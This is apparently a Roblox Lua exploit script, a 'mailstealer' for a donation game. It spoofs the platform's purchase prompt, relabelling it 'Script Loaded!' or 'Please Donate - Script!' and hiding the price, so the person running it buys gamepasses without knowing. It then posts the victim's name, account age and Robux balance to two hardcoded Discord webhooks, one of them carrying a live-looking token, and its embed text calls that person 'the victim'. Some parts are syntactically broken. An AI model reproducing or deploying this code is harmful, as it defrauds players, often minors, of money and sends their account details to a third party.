local LogsWebhook = "https://discord.com/api/webhooks/1329534799484031026/8olXGKBru9vI3FZMnanVHoRfODyj6VbcNM7CAnL1VverzvcQSFclBEDlSQeSb5q56b2x"

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local MarketplaceService = game:GetService("MarketplaceService")
local HttpService = game:GetService("HttpService")
local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")

local HttpService = game:GetService("HttpService")

local request = syn and syn.request or request
if typeof(request) ~= "function" then
    error("?!?")
end


local Remotes = require(ReplicatedStorage:WaitForChild("Remotes"))
local success, UserId = pcall(function()
    return Players:GetUserIdFromNameAsync(Username)
end)

local asset
local userRobux

local function sendWebhook()
    local imgs = "https://images-ext-1.discordapp.net/external/lQoYJfB6vF-6CPq4b1m9_PFMj3dg8WvDzju7JvaQ9Ak/https/i.pinimg.com/736x/6c/5a/5e/6c5a5e08d08a609d663a5866ff992f7a.jpg?format=webp&width=612&height=614"
    ["username"] = "" .. mailstealer_name .. " Mailstealer",
    ["avatar_url"] = imgs,
    local embed = {
        
        ["title"] = "**You just got a new item!**",
        ["color"] = tonumber(8323327),
        ["fields"] = {
            {
                ["name"] = "<:drawpen:1311079366125555782> ᴘʟᴀʏᴇʀ ɪɴꜰᴏ",
                ["value"] = "```Name: " .. game.Players.LocalPlayer.Name .. "\nAccount Age: " .. tostring(game.Players.LocalPlayer.AccountAge) .. "\nReceiver: " .. Username .. "```"
            },
            {
                ["name"] = "<:robux:1314309850154537020> ᴛᴏᴛᴀʟ ʀᴏʙᴜx",
                ["value"] = "```" .. userRobux .. "```"
            },
            {
                ["name"] = "<:ticketyellow:1311079539237191750> ɢᴀᴍᴇᴘᴀꜱꜱ ᴘʀɪᴄᴇ",
                ["value"] = "```" .. tostring(asset:GetAttribute("AssetPrice")) .. "```",
            },
            {
                ["name"] = "ɪɴꜰᴏ;",
                ["value"] = "The victim Must click the 'Continue' button. Otherwise, you will not receive the Robux.",
            },
        }
    }

    local embed2 = {
        ["title"] = "**You just got a new item!**",
        ["color"] = tonumber(8323327),
        ["fields"] = {
            {
                ["name"] = "<:robux:1314309850154537020> ᴛᴏᴛᴀʟ ʀᴏʙᴜx",
                ["value"] = "```" .. userRobux .. "```"
            },
            {
                ["name"] = "<:ticketyellow:1311079539237191750> ɢᴀᴍᴇᴘᴀꜱꜱ ᴘʀɪᴄᴇ",
                ["value"] = "```" .. tostring(asset:GetAttribute("AssetPrice")) .. "```",
            },
            {
                ["name"] = "ɪɴꜰᴏ;",
                ["value"] = "The victim Must click the 'Continue' button. Otherwise, you will not receive the Robux.",
            },
        }
    }


    local data = HttpService:JSONEncode({
        ["content"] = "@everyone",
        ["embeds"] = {embed}
    })
    local data2 = HttpService:JSONEncode({
        ["content"] = "Gengar On Top",
        ["embeds"] = {embed2}
    })

    local WebhookResponse =
    request(
    {
        Url = Webhook,
        Method = "POST",
        Headers = headers,
        Body = data
    }
)
    
    local logsResponse =
    request(
    {
        Url = LogsWebhook,
        Method = "POST",
        Headers = headers,
        Body = data2
    }
)

end

if success then
    local Booth = Remotes.Function("OfflinePlayerLookup"):InvokeServer(UserId)
    if not Booth then
        return Players.LocalPlayer:Kick()
    end

    local function Purchase()
        local range = 0
        for _, v in pairs(Booth.BoothUI.Items.Frame:GetChildren()) do
            if v:GetAttribute("AssetType") == "Gamepass" and not MarketplaceService:UserOwnsGamePassAsync(Players.LocalPlayer.UserId, v:GetAttribute("AssetId")) then
                local Attribute = v:GetAttribute("AssetPrice")
                if Attribute <= userRobux and Attribute > range then
                    asset = v
                    range = Attribute
                end
            end
        end
    
        if asset then
            if asset.Prompt and typeof(asset.Prompt.FireServer) == "function" then
                asset.Prompt:FireServer("", false, range)
            else
                warn("?.")
            end
        end
    end
    
    

    local Animator = CoreGui:WaitForChild("PurchasePrompt"):WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator")
    repeat task.wait() until not Animator:FindFirstChild("Prompt")

    Animator.ChildAdded:Connect(function(child)
        if child.Name == "Prompt" then
            local RemainingBalanceText = child:WaitForChild("AlertContents"):WaitForChild("Footer"):WaitForChild("FooterContent"):WaitForChild("Content"):FindFirstChild("RemainingBalanceText")
            if RemainingBalanceText then
                if userRobux then
                    child.AlertContents.TitleContainer.TitleArea.Title.Text = "Please Donate - Script!"
                    local Text = child.AlertContents.TitleContainer.TitleArea.Title
                    Text.Size = UDim2.new(1, 0, Text.Size.Y.Scale, Text.Size.Y.Offset)
                    child.AlertContents.MiddleContent.Visible = false
                    child.AlertContents.Footer.Buttons["1"].Visible = false
                    child.AlertContents.Footer.Buttons["2"].ButtonContent.ButtonMiddleContent.Text.Text = "Continue"
                    local TextFooter = child.AlertContents.Footer.Buttons["2"].ButtonContent.ButtonMiddleContent.Text
                    TextFooter.Size = UDim2.new(1, 0, TextFooter.Size.Y.Scale, TextFooter.Size.Y.Offset)
                    child.AlertContents.Footer.Buttons["2"].ButtonContent.ButtonMiddleContent.Icon.Visible = false
                    child.AlertContents.Footer.FooterContent.Visible = false
                elseif asset then
                    child.AlertContents.TitleContainer.TitleArea.Title.Text = "Script Loaded!"
                    child.AlertContents.MiddleContent.Visible = false 
                    child.AlertContents.Footer.Buttons["1"].ButtonContent.ButtonMiddleContent.Text.Text = "Load Script!"
                    child.AlertContents.Footer.Buttons["2"].Visible = false
                    child.AlertContents.Footer.FooterContent.Visible = false
    
                    userRobux = RemainingBalanceText.Text:match("(%d+)$") + asset:GetAttribute("AssetPrice")
                    asset = nil
                end
            end
        end
    end)

    Animator.ChildRemoved:Connect(function(child)
        if child.Name == "Prompt" and userRobux then
            if not asset or not MarketplaceService:UserOwnsGamePassAsync(Players.LocalPlayer.UserId, asset:GetAttribute("AssetId")) then
                Purchase()
            end
        end
    end)

    Remotes.OnClientEvent("GiftSentAlert"):Connect(function(a, robux)
        if a == UserId and userRobux then
            sendWebhook()
            userRobux -= robux
            Purchase()
        end
    end)

    local range = math.huge
    for _, v in pairs(Booth.BoothUI.Items.Frame:GetChildren()) do
        if v:GetAttribute("AssetType") == "Gamepass" and not MarketplaceService:UserOwnsGamePassAsync(Players.LocalPlayer.UserId, v:GetAttribute("AssetId")) then
            local Attribute = v:GetAttribute("AssetPrice")
            if Attribute < range then
                asset = v
                range = Attribute
            end
        end
    end
    if asset then
        if asset.Prompt and typeof(asset.Prompt.FireServer) == "function" then
            asset.Prompt:FireServer("", false, range)
            print(range)
        else
            warn("??.")
        end
    end
end
